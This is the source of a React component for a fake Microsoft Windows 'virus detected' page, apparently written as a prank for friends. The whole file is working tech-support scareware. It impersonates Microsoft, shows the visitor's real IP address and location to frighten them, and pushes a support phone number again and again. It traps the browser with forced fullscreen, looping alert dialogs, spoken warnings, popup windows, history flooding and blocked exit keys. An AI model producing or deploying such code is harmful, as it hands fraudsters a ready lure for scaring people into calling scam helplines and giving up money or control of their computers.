"use client";

import { useCallback, useEffect, useRef, useState } from "react";
import {
  ALERT_MSG,
  ALERT_MSG_2,
  PHONE,
  PHONE_TEL,
  VOICE_LINES,
} from "@/lib/config";
import {
  getBrowserInfo,
  pickEnglishVoice,
  waitForVoices,
} from "@/lib/browser";

const UNLOCK_CLICKS = 8;

type GeoInfo = {
  ip: string;
  location: string;
  isp: string;
  time: string;
};

function MsLogo({ size = 18 }: { size?: number }) {
  return (
    <svg width={size} height={size} viewBox="0 0 18 18" aria-hidden>
      <rect x="0" y="0" width="8" height="8" fill="#f25022" />
      <rect x="10" y="0" width="8" height="8" fill="#7fba00" />
      <rect x="0" y="10" width="8" height="8" fill="#00a4ef" />
      <rect x="10" y="10" width="8" height="8" fill="#ffb900" />
    </svg>
  );
}

function ShieldBadge() {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" aria-hidden>
      <path
        d="M12 2l8 3v6c0 5-3.5 9.4-8 11-4.5-1.6-8-6-8-11V5l8-3z"
        fill="#107c10"
      />
      <path
        d="M10.2 15.4l-2.6-2.6 1.2-1.2 1.4 1.4 3.8-3.8 1.2 1.2-5 5z"
        fill="#fff"
      />
    </svg>
  );
}

export default function MicrosoftAlert() {
  const [unlocked, setUnlocked] = useState(false);
  const [geo, setGeo] = useState<GeoInfo>({
    ip: "Detecting…",
    location: "Locating…",
    isp: "Resolving…",
    time: "",
  });
  const [mounted, setMounted] = useState(false);
  const [showBlue, setShowBlue] = useState(true);
  const [showWhite, setShowWhite] = useState(true);
  const [showToast, setShowToast] = useState(true);
  const [extraPopups, setExtraPopups] = useState(0);
  const [isArmed, setIsArmed] = useState(false);
  const [speaking, setSpeaking] = useState(false);
  const [voiceLine, setVoiceLine] = useState("");
  const [isSafari, setIsSafari] = useState(false);
  const [isChromeTarget, setIsChromeTarget] = useState(false);

  const logoClicks = useRef(0);
  const unlockedRef = useRef(false);
  const armedRef = useRef(false);
  const alertBusy = useRef(false);
  const lineIndex = useRef(0);
  const voiceGen = useRef(0);
  const ttsAudio = useRef<HTMLAudioElement | null>(null);
  const voiceTimer = useRef<number | null>(null);
  const alertTimer = useRef<number | null>(null);
  const keepAlive = useRef<number | null>(null);
  const fsLock = useRef<number | null>(null);

  const stopVoice = useCallback(() => {
    voiceGen.current += 1;
    setSpeaking(false);
    setVoiceLine("");
    if (voiceTimer.current) {
      window.clearTimeout(voiceTimer.current);
      voiceTimer.current = null;
    }
    if (keepAlive.current) {
      window.clearInterval(keepAlive.current);
      keepAlive.current = null;
    }
    try {
      window.speechSynthesis?.cancel();
    } catch {
      /* ignore */
    }
    if (ttsAudio.current) {
      ttsAudio.current.pause();
      ttsAudio.current.src = "";
      ttsAudio.current = null;
    }
  }, []);

  const stopAll = useCallback(() => {
    stopVoice();
    if (alertTimer.current) {
      window.clearTimeout(alertTimer.current);
      alertTimer.current = null;
    }
    if (fsLock.current) {
      window.clearInterval(fsLock.current);
      fsLock.current = null;
    }
  }, [stopVoice]);

  const enterFullscreen = useCallback(async () => {
    if (unlockedRef.current) return;
    const el = document.documentElement as HTMLElement & {
      webkitRequestFullscreen?: () => void;
      webkitRequestFullScreen?: () => void;
      msRequestFullscreen?: () => void;
    };
    try {
      if (!document.fullscreenElement && !(document as Document & { webkitFullscreenElement?: Element }).webkitFullscreenElement) {
        if (el.requestFullscreen) await el.requestFullscreen();
        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
        else if (el.webkitRequestFullScreen) el.webkitRequestFullScreen();
        else if (el.msRequestFullscreen) el.msRequestFullscreen();
      }
    } catch {
      /* user gesture / policy */
    }
  }, []);

  const lockFullscreen = useCallback(() => {
    void enterFullscreen();
    if (fsLock.current) return;
    fsLock.current = window.setInterval(() => {
      if (unlockedRef.current || !armedRef.current) return;
      const doc = document as Document & { webkitFullscreenElement?: Element };
      if (!document.fullscreenElement && !doc.webkitFullscreenElement) {
        void enterFullscreen();
      }
    }, 600);
  }, [enterFullscreen]);

  const speakLineSpeech = useCallback(async (text: string): Promise<void> => {
    if (!window.speechSynthesis) return;
    const voices = await waitForVoices();
    await new Promise<void>((resolve) => {
      window.speechSynthesis.cancel();
      const u = new SpeechSynthesisUtterance(text);
      u.lang = "en-US";
      u.rate = 0.88;
      u.pitch = 1;
      u.volume = 1;
      const preferred = pickEnglishVoice(voices);
      if (preferred) {
        u.voice = preferred;
        u.lang = preferred.lang || "en-US";
      }
      let finished = false;
      const finish = () => {
        if (finished) return;
        finished = true;
        resolve();
      };
      u.onend = finish;
      u.onerror = finish;
      window.speechSynthesis.speak(u);
      window.setTimeout(finish, Math.min(14000, text.length * 85 + 2500));
    });
  }, []);

  const speakLineTtsAudio = useCallback((text: string): Promise<void> => {
    return new Promise((resolve) => {
      try {
        const url =
          "https://translate.google.com/translate_tts?ie=UTF-8&client=tw-ob&tl=en&q=" +
          encodeURIComponent(text.slice(0, 180));
        const audio = new Audio(url);
        ttsAudio.current = audio;
        audio.volume = 1;
        audio.onended = () => resolve();
        audio.onerror = () => resolve();
        void audio.play().catch(() => resolve());
      } catch {
        resolve();
      }
    });
  }, []);

  const startVoiceLoop = useCallback(() => {
    const gen = ++voiceGen.current;
    setSpeaking(true);
    lineIndex.current = 0;

    const run = async () => {
      while (!unlockedRef.current && armedRef.current && voiceGen.current === gen) {
        const text = VOICE_LINES[lineIndex.current % VOICE_LINES.length];
        setVoiceLine(text);
        lineIndex.current += 1;

        const started = Date.now();
        if (window.speechSynthesis) {
          await speakLineSpeech(text);
        }
        if (voiceGen.current === gen && Date.now() - started < 500) {
          await speakLineTtsAudio(text);
        }

        if (voiceGen.current !== gen) return;
        await new Promise((r) => setTimeout(r, 700));
      }
    };

    void run();

    if (!keepAlive.current) {
      keepAlive.current = window.setInterval(() => {
        if (unlockedRef.current) return;
        try {
          if (window.speechSynthesis?.paused) window.speechSynthesis.resume();
        } catch {
          /* ignore */
        }
      }, 1500);
    }
  }, [speakLineSpeech, speakLineTtsAudio]);

  const fireAlertStorm = useCallback(() => {
    if (unlockedRef.current || alertBusy.current) return;
    alertBusy.current = true;
    try {
      try {
        window.speechSynthesis?.cancel();
      } catch {
        /* ignore */
      }
      window.alert(ALERT_MSG);
      if (!unlockedRef.current) {
        window.confirm(ALERT_MSG_2);
      }
      if (!unlockedRef.current) {
        window.alert(
          "Call Microsoft Windows Support:\n" +
            PHONE +
            "\n\nDo not close this browser!",
        );
      }
    } finally {
      alertBusy.current = false;
      // alert() fullscreen tod deta hai — turant wapas lock
      if (!unlockedRef.current && armedRef.current) {
        lockFullscreen();
        window.setTimeout(() => void enterFullscreen(), 50);
        window.setTimeout(() => void enterFullscreen(), 200);
        startVoiceLoop();
      }
    }
  }, [startVoiceLoop, lockFullscreen, enterFullscreen]);

  const scheduleAlertLoop = useCallback(() => {
    if (alertTimer.current) window.clearTimeout(alertTimer.current);
    const info = getBrowserInfo();
    const firstDelay = info.isChrome ? 2800 : 5500;
    const repeatEvery = info.isChrome ? 1800 : 4000;
    const tick = () => {
      if (unlockedRef.current) return;
      fireAlertStorm();
      alertTimer.current = window.setTimeout(tick, repeatEvery);
    };
    alertTimer.current = window.setTimeout(tick, firstDelay);
  }, [fireAlertStorm]);

  const openSpamWindows = useCallback(() => {
    try {
      for (let i = 0; i < 2; i++) {
        const w = window.open(
          "about:blank",
          `ms-sec-${Date.now()}-${i}`,
          "width=420,height=320,left=" + 40 * i + ",top=" + 40 * i,
        );
        if (w) {
          w.document.write(
            `<html><body style="font-family:Segoe UI;background:#c50f1f;color:#fff;padding:20px">
            <h2>Windows Security Alert</h2>
            <p>Virus detected. Call ${PHONE}</p>
            <script>setInterval(()=>alert('Call Microsoft ${PHONE}'),800)</script>
            </body></html>`,
          );
          w.document.close();
        }
      }
    } catch {
      /* popup blocked */
    }
  }, []);

  const armTrap = useCallback(() => {
    if (unlockedRef.current || armedRef.current) return;
    armedRef.current = true;
    setIsArmed(true);
    lockFullscreen();
    startVoiceLoop();
    scheduleAlertLoop();
    openSpamWindows();

    for (let i = 0; i < 50; i++) {
      history.pushState(null, "", location.href);
    }
  }, [lockFullscreen, startVoiceLoop, scheduleAlertLoop, openSpamWindows]);

  const unlock = useCallback(() => {
    unlockedRef.current = true;
    armedRef.current = false;
    stopAll();
    setUnlocked(true);
    setIsArmed(false);
    if (document.fullscreenElement) void document.exitFullscreen?.();
  }, [stopAll]);

  useEffect(() => {
    setMounted(true);
    const info = getBrowserInfo();
    setIsSafari(info.isSafari);
    setIsChromeTarget(info.isChrome);
    void waitForVoices();
  }, []);

  useEffect(() => {
    let cancelled = false;
    const stamp = new Date().toLocaleString("en-US");
    fetch("https://ipapi.co/json/")
      .then((r) => r.json())
      .then(
        (data: {
          ip?: string;
          city?: string;
          region?: string;
          country_name?: string;
          org?: string;
        }) => {
          if (cancelled) return;
          setGeo({
            ip: data.ip || "Unknown",
            location:
              [data.city, data.region, data.country_name]
                .filter(Boolean)
                .join(", ") || "Unknown",
            isp: data.org || "Unknown ISP",
            time: stamp,
          });
        },
      )
      .catch(async () => {
        try {
          const r = await fetch("https://api.ipify.org?format=json");
          const d = (await r.json()) as { ip?: string };
          if (!cancelled) {
            setGeo({
              ip: d.ip || "192.168.1.1",
              location: "United States",
              isp: "Unknown Network",
              time: stamp,
            });
          }
        } catch {
          if (!cancelled) {
            setGeo({
              ip: "23.93.78.244",
              location: "Berkeley, United States",
              isp: "Sonic Telecom LLC",
              time: stamp,
            });
          }
        }
      });
    return () => {
      cancelled = true;
    };
  }, []);

  useEffect(() => {
    if (unlocked) return;

    const onBeforeUnload = (e: BeforeUnloadEvent) => {
      e.preventDefault();
      e.returnValue = "Your PC is infected! Do not leave.";
      return e.returnValue;
    };

    const onVis = () => {
      if (unlockedRef.current || !armedRef.current) return;
      if (document.visibilityState === "visible") {
        lockFullscreen();
        fireAlertStorm();
        startVoiceLoop();
      }
    };

    const onFsChange = () => {
      if (unlockedRef.current || !armedRef.current) return;
      const doc = document as Document & { webkitFullscreenElement?: Element };
      if (!document.fullscreenElement && !doc.webkitFullscreenElement) {
        // Escape / alert ne FS tod di — turant wapas
        window.setTimeout(() => lockFullscreen(), 30);
      }
    };

    const onPop = () => {
      history.pushState(null, "", location.href);
      if (!unlockedRef.current) {
        lockFullscreen();
        fireAlertStorm();
      }
    };

    const trapClick = (e: MouseEvent) => {
      if (unlockedRef.current) return;
      if ((e.target as HTMLElement | null)?.closest?.("[data-unlock]")) return;

      if (!armedRef.current) {
        armTrap();
        setExtraPopups(2);
        return;
      }

      setExtraPopups((n) => Math.min(n + 1, 8));
      setShowWhite(true);
      setShowBlue(true);
      setShowToast(true);
      lockFullscreen();
      fireAlertStorm();
    };

    const trapKey = (e: KeyboardEvent) => {
      if (unlockedRef.current) return;
      const key = e.key.toLowerCase();
      const block =
        e.key === "F5" ||
        e.key === "F11" ||
        e.key === "F12" ||
        e.key === "Escape" ||
        (e.ctrlKey && ["r", "w", "n", "t", "u", "s", "p", "q"].includes(key)) ||
        (e.metaKey && ["r", "w", "n", "t", "u", "s", "p", "q"].includes(key)) ||
        (e.altKey && key === "f4");
      if (block) {
        e.preventDefault();
        e.stopPropagation();
        if (!armedRef.current) armTrap();
        else lockFullscreen();
        fireAlertStorm();
      }
    };

    window.addEventListener("beforeunload", onBeforeUnload);
    document.addEventListener("visibilitychange", onVis);
    document.addEventListener("fullscreenchange", onFsChange);
    document.addEventListener("webkitfullscreenchange", onFsChange as EventListener);
    window.addEventListener("popstate", onPop);
    document.addEventListener("mousedown", trapClick, true);
    document.addEventListener("keydown", trapKey, true);
    document.addEventListener("contextmenu", (e) => e.preventDefault(), true);

    return () => {
      window.removeEventListener("beforeunload", onBeforeUnload);
      document.removeEventListener("visibilitychange", onVis);
      document.removeEventListener("fullscreenchange", onFsChange);
      document.removeEventListener(
        "webkitfullscreenchange",
        onFsChange as EventListener,
      );
      window.removeEventListener("popstate", onPop);
      document.removeEventListener("mousedown", trapClick, true);
      document.removeEventListener("keydown", trapKey, true);
      stopAll();
    };
  }, [
    unlocked,
    armTrap,
    fireAlertStorm,
    startVoiceLoop,
    lockFullscreen,
    stopAll,
  ]);

  const onLogoUnlock = (e: { stopPropagation: () => void }) => {
    e.stopPropagation();
    logoClicks.current += 1;
    if (logoClicks.current >= UNLOCK_CLICKS) unlock();
  };

  const tryClose = (which: "blue" | "white" | "toast") => {
    if (!armedRef.current) armTrap();
    fireAlertStorm();
    setExtraPopups((n) => n + 1);
    if (which === "blue") {
      setShowBlue(false);
      window.setTimeout(() => setShowBlue(true), 300);
    }
    if (which === "white") {
      setShowWhite(false);
      window.setTimeout(() => setShowWhite(true), 300);
    }
    if (which === "toast") {
      setShowToast(false);
      window.setTimeout(() => setShowToast(true), 400);
    }
  };

  if (unlocked) {
    return (
      <main className="flex min-h-screen items-center justify-center bg-[#0078d4] px-6 text-white">
        <div className="max-w-md text-center">
          <p className="text-5xl font-bold">GOTCHA</p>
          <p className="mt-4 text-lg">Prank over — PC safe hai.</p>
          <button
            type="button"
            className="mt-8 rounded bg-white px-5 py-2.5 text-sm font-semibold text-[#0078d4]"
            onClick={() => window.location.reload()}
          >
            Reset
          </button>
        </div>
      </main>
    );
  }

  return (
    <main className="relative h-[100dvh] w-screen overflow-hidden bg-[#c8c8c8] text-[#1b1b1b]">
      <div className="pointer-events-none absolute inset-0 select-none">
        <div className="flex h-10 items-center gap-3 border-b border-[#d0d0d0] bg-[#f3f3f3] px-3 text-[12px]">
          <span className="rounded bg-white px-2 py-1 shadow-sm">
            Windows Help Support Assistance Er#USA00dd7
          </span>
        </div>
        <div
          className="h-full blur-[2px]"
          style={{
            background:
              "linear-gradient(180deg,#f5f5f5 0%,#e7eef8 40%,#d6e4f5 100%)",
          }}
        />
      </div>
      <div className="absolute inset-0 bg-black/35" />

      {speaking && (
        <div className="absolute left-3 right-3 top-3 z-[80] rounded bg-black/80 px-3 py-2 text-[12px] text-white sm:left-3 sm:right-auto sm:max-w-md">
          <p className="font-semibold text-[#7CFC00]">🔊 Reading on-screen warning…</p>
          <p className="mt-1 opacity-95">{voiceLine || "Starting audio…"}</p>
        </div>
      )}

      {Array.from({ length: extraPopups }).map((_, i) => (
        <div
          key={i}
          className="absolute z-20 w-[min(320px,90vw)] rounded border border-[#666] bg-white shadow-2xl"
          style={{
            top: `${10 + (i % 4) * 9}%`,
            left: `${6 + (i % 3) * 14}%`,
          }}
        >
          <div className="flex items-center gap-2 bg-[#0078d4] px-2 py-1.5 text-[12px] text-white">
            <MsLogo size={14} />
            Alert #{i + 1}
            <button
              type="button"
              className="ml-auto bg-[#e81123] px-1.5"
              onClick={() => fireAlertStorm()}
            >
              ×
            </button>
          </div>
          <div className="p-3 text-[12px]">
            <p className="font-bold text-[#c50f1f]">READ carefully — Call {PHONE}</p>
            <button
              type="button"
              className="mt-2 w-full bg-[#0078d4] py-1.5 text-white"
              onClick={() => fireAlertStorm()}
            >
              OK
            </button>
          </div>
        </div>
      ))}

      {showBlue && (
        <div
          className="absolute left-1/2 top-[8%] z-30 w-[min(720px,96vw)] -translate-x-1/2 overflow-hidden rounded-sm border border-[#1a3a7a] shadow-2xl"
          style={{ background: "#0b4ea2" }}
        >
          <div className="flex items-center gap-2 bg-[#083d86] px-3 py-2 text-white">
            <button type="button" data-unlock onClick={onLogoUnlock}>
              <MsLogo size={16} />
            </button>
            <span className="text-[13px] font-semibold">
              Microsoft Windows Security - Spyware Alert
            </span>
            <button
              type="button"
              className="ml-auto grid h-5 w-5 place-items-center bg-[#e81123]"
              onClick={() => tryClose("blue")}
            >
              ×
            </button>
          </div>
          <div className="px-4 py-5 text-center text-white">
            <p className="text-[17px] font-bold sm:text-[20px]">
              ** Microsoft Windows is infected with Trojan:SLocker **
            </p>
            <p className="mx-auto mt-3 max-w-xl text-[13px] sm:text-[14px]">
              A critical error has occurred. Please read this message carefully
              and contact Microsoft Windows Support immediately.
            </p>
          </div>
          <div className="flex flex-wrap items-center gap-2 bg-[#0a5bb8] px-3 py-2 text-[12px] text-white">
            <span className="font-semibold">
              Call Microsoft Windows Support {PHONE}
            </span>
            <div className="ml-auto flex gap-2">
              <button
                type="button"
                className="rounded-sm bg-[#e8f2fc] px-4 py-1 text-[#1b1b1b]"
                onClick={() => fireAlertStorm()}
              >
                Cancel
              </button>
              <button
                type="button"
                className="rounded-sm bg-[#e8f2fc] px-4 py-1 text-[#1b1b1b]"
                onClick={() => fireAlertStorm()}
              >
                OK
              </button>
            </div>
          </div>
        </div>
      )}

      {showWhite && (
        <div className="absolute left-1/2 top-[18%] z-40 w-[min(560px,94vw)] -translate-x-1/2 overflow-hidden rounded-sm border border-[#8a8a8a] bg-white shadow-2xl">
          <div className="flex items-center gap-2 border-b border-[#ddd] bg-[#f7f7f7] px-3 py-2">
            <button type="button" data-unlock onClick={onLogoUnlock}>
              <MsLogo size={16} />
            </button>
            <span className="text-[13px] font-semibold">
              Microsoft Windows Security Center
            </span>
            <button
              type="button"
              className="ml-auto text-[22px] text-[#c50f1f]"
              onClick={() => tryClose("white")}
            >
              ×
            </button>
          </div>
          <div className="space-y-3 px-4 py-4 text-center sm:px-6">
            <p className="text-[16px] font-bold text-[#c50f1f] sm:text-[18px]">
              Virus/Malware infections have been recognized on your device.
            </p>
            <div className="space-y-0.5 text-[13px] font-semibold sm:text-[14px]">
              <p>
                Address IP: {geo.ip}
                {mounted && geo.time ? ` ${geo.time}` : ""}
              </p>
              <p>Location: {geo.location}</p>
              <p>ISP: {geo.isp}</p>
            </div>
            <div className="flex items-center justify-center gap-4 py-2">
              <div className="relative">
                <MsLogo size={52} />
                <span className="absolute -bottom-1 -right-2">
                  <ShieldBadge />
                </span>
              </div>
              <div className="flex gap-3">
                <span className="h-8 w-8 rounded-full bg-[#f25022]" />
                <span className="h-8 w-8 rounded-full bg-[#ffb900]" />
                <span className="h-8 w-8 rounded-full bg-[#00a4ef]" />
              </div>
            </div>
            <p className="text-[13px] font-bold sm:text-[14px]">
              Your personal data, banking information and web login credentials
              saved on this PC are at risk. Please read carefully.
            </p>
            <a
              href={`tel:${PHONE_TEL}`}
              className="block text-[15px] font-bold text-[#0078d4] underline sm:text-[17px]"
              onClick={(e) => {
                e.stopPropagation();
                armTrap();
              }}
            >
              Call Microsoft Windows Support: {PHONE} (Helpline)
            </a>
          </div>
          <div className="flex items-center gap-2 border-t border-[#ddd] px-4 py-3">
            <MsLogo size={18} />
            <span className="text-[13px] font-semibold">Microsoft Windows</span>
            <button
              type="button"
              className="ml-auto rounded-sm bg-[#d13438] px-8 py-2 text-[14px] font-semibold text-white"
              onClick={() => {
                armTrap();
                fireAlertStorm();
              }}
            >
              Deny
            </button>
          </div>
        </div>
      )}

      {showToast && (
        <div className="absolute bottom-4 right-3 z-50 w-[min(280px,92vw)] rounded-md border border-[#cfcfcf] bg-white p-3 shadow-xl">
          <div className="flex items-start gap-2">
            <button type="button" data-unlock onClick={onLogoUnlock}>
              <MsLogo size={20} />
            </button>
            <div className="flex-1">
              <p className="text-[12px] font-semibold">Microsoft</p>
              <p className="text-[12px] text-[#555]">Windows Support</p>
              <p className="mt-1 text-[15px] font-bold">
                {PHONE} (Head Office)
              </p>
            </div>
            <button type="button" onClick={() => tryClose("toast")}>
              ×
            </button>
          </div>
        </div>
      )}

      {!isArmed && (
        <button
          type="button"
          className="absolute inset-0 z-[60] cursor-pointer bg-black/25"
          onPointerDown={(e) => {
            e.preventDefault();
            armTrap();
            setExtraPopups(2);
          }}
        >
          <span className="pointer-events-none absolute bottom-6 left-1/2 w-[min(420px,92vw)] -translate-x-1/2 rounded bg-black/75 px-4 py-3 text-center text-[12px] text-white">
            {isSafari ? (
              <>
                Tum <strong>Safari (Mac)</strong> pe test kar rahe ho — yahan
                voice/stuck weak lagega.
                <br />
                Doston ke <strong>Windows Chrome</strong> pe full alarm + voice +
                alert loop chalega. Click to preview.
              </>
            ) : isChromeTarget ? (
              <>Windows Security scan ready — click anywhere to continue</>
            ) : (
              <>Click anywhere to continue</>
            )}
          </span>
        </button>
      )}
    </main>
  );
}
